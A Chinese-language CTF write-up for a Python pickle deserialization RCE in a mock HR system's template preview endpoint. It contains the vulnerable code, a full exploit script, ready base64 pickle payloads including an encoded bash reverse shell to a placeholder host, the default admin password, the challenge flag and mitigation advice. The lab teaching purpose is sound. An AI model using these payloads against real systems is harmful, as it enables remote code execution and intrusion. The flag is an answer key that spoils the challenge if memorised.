# CTF Web题目解题文档

## 题目信息

- **题目名称**: 员工绩效管理系统
- **漏洞类型**: Python Pickle 反序列化 RCE (CWE-502)
- **难度等级**: 高级
- **Flag位置**: `/flag`

## 解题思路

### 第一步：信息收集

1. **访问目标系统**: http://target:5000
2. **分析系统功能**: 这是一个员工绩效管理系统，具有用户登录、评估管理、模板配置等功能
3. **查看登录页面**: 发现有测试账户信息提示

### 第二步：获取访问权限

使用默认管理员账户登录：
- 用户名: `admin`
- 密码: `admin@2024`

### 第三步：功能探索

登录后发现管理员有以下特权：
- 访问系统管理功能
- 模板管理（创建、编辑、预览）
- 这里的"模板管理"是关键突破点

### 第四步：漏洞发现

在模板管理功能中发现：

1. **模板创建页面** (`/admin/templates/create`)
   - 支持模板内容编辑
   - 支持变量配置
   - **关键发现**: 变量配置支持"高级序列化格式"

2. **变量配置格式**:
   - 标准JSON: `{"key": "value"}`
   - **危险的序列化格式**: `pickle:<base64编码数据>`

3. **模板预览功能** (`/admin/templates/preview`)
   - 使用AJAX POST请求
   - 接受JSON格式的模板数据
   - **漏洞点**: 直接反序列化用户输入的pickle数据

### 第五步：代码分析

查看源代码 `app.py` 中的 `preview_template()` 函数：

```python
@app.route('/admin/templates/preview', methods=['POST'])
@admin_required
def preview_template():
    try:
        template_data = request.json
        content = template_data.get('content', '')
        variables_str = template_data.get('variables', '{}')
        
        # 漏洞点：直接使用pickle.loads反序列化用户输入
        if variables_str.startswith('pickle:'):
            encoded_data = variables_str[7:]
            try:
                # 危险！！！
                variables = pickle.loads(base64.b64decode(encoded_data))
            except Exception as e:
                return jsonify({'error': f'变量反序列化失败: {str(e)}'}), 400
        else:
            variables = json.loads(variables_str)
        
        # ... 模板渲染逻辑
```

**漏洞原理**:
- 系统为支持"复杂变量配置"而引入了pickle序列化功能
- 当变量字符串以`pickle:`开头时，系统会base64解码并使用`pickle.loads()`反序列化
- Python的pickle模块在反序列化时会执行对象的`__reduce__`方法
- 攻击者可以构造恶意对象，在反序列化时执行任意代码

### 第六步：漏洞利用

#### 6.1 构造恶意Payload

创建恶意类：
```python
import pickle
import base64
import os

class RCEPayload:
    def __init__(self, command):
        self.command = command
    
    def __reduce__(self):
        # pickle反序列化时会调用这个方法
        return (os.system, (self.command,))

# 生成读取flag的payload
payload_obj = RCEPayload("cat /flag")
pickled = pickle.dumps(payload_obj)
encoded = base64.b64encode(pickled).decode('utf-8')
print(f"pickle:{encoded}")
```

#### 6.2 发送攻击请求

使用浏览器开发者工具或脚本发送POST请求到 `/admin/templates/preview`:

```json
{
  "content": "测试模板 {{test}}",
  "variables": "pickle:gASVJAAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjAljYXQgL2ZsYWeUhZRSlC4="
}
```

#### 6.3 利用过程

1. **访问模板创建页面**: 系统管理 → 模板管理 → 创建新模板
2. **填写基本信息**:
   - 模板名称: "攻击测试"
   - 模板内容: "测试内容 {{test}}"
3. **输入恶意变量配置**:
   ```
   pickle:gASVJAAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjAljYXQgL2ZsYWeUhZRSlC4=
   ```
4. **点击"预览效果"按钮**: 触发AJAX请求，执行恶意代码

## 完整攻击脚本

```python
#!/usr/bin/env python3
import requests
import pickle
import base64
import os

class RCEPayload:
    def __init__(self, command):
        self.command = command
    
    def __reduce__(self):
        return (os.system, (self.command,))

# 目标URL
target_url = "http://target:5000"
session = requests.Session()

# 1. 登录
login_data = {
    'username': 'admin',
    'password': 'admin@2024'
}
session.post(f"{target_url}/login", data=login_data)

# 2. 生成攻击载荷
payload_obj = RCEPayload("cat /flag")
pickled = pickle.dumps(payload_obj)
encoded = base64.b64encode(pickled).decode('utf-8')

# 3. 发送攻击请求
attack_data = {
    "content": "攻击测试 {{test}}",
    "variables": f"pickle:{encoded}"
}

response = session.post(
    f"{target_url}/admin/templates/preview",
    json=attack_data,
    headers={'Content-Type': 'application/json'}
)

print("攻击请求已发送，flag已被读取")
```

## 快速攻击方法

### 方法一：使用提供的工具

```bash
# 1. 生成payload
python generate_payload.py

# 2. 选择"读取flag文件"的payload
# 3. 复制生成的payload到web界面

# 4. 或者直接使用攻击脚本
python exploit_demo.py
```

### 方法二：手动攻击

1. **登录**: admin / admin@2024
2. **导航**: 系统管理 → 模板管理 → 创建新模板
3. **填写表单**:
   - 模板名称: 任意
   - 模板内容: 任意
   - 变量配置: `pickle:gASVJAAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjAljYXQgL2ZsYWeUhZRSlC4=`
4. **点击**: "预览效果"
5. **获取**: Flag内容

## 其他攻击载荷

### 反弹Shell
```
pickle:gASVSgAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjC9iYXNoIC1jICdiYXNoIC1pID4mIC9kZXYvdGNwL3lvdXJfaXAvNDQ0NCAwPiYxJ5SFlFKULg==
```

### 系统信息收集
```
pickle:gASVMwAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjBh1bmFtZSAtYSAmJiB3aG9hbWkgJiYgaWSUhZRSlC4=
```

### 创建后门文件
```
pickle:gASVQgAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjCdlY2hvICdDVEZfUFdOX1NVQ0NFU1MnID4gL3RtcC9wd25lZC50eHSUhZRSlC4=
```

## Flag

```
wmctf{P1ckl3_D3s3r14l1z4t10n_1s_D4ng3r0us_4nd_RCE}
```

## 防护措施

1. **禁用pickle**: 完全避免反序列化不受信任的数据
2. **输入验证**: 严格验证和过滤用户输入
3. **权限控制**: 限制危险功能的访问
4. **沙箱环境**: 在隔离环境中执行不安全操作
5. **安全编码**: 使用JSON等安全的数据格式

## 学习要点

1. **Pickle漏洞**: Python pickle模块的安全风险
2. **代码审计**: 如何发现反序列化漏洞
3. **权限提升**: 利用功能设计缺陷提升权限
4. **攻击面分析**: 系统功能中的安全边界
5. **防御思路**: 安全编码的最佳实践 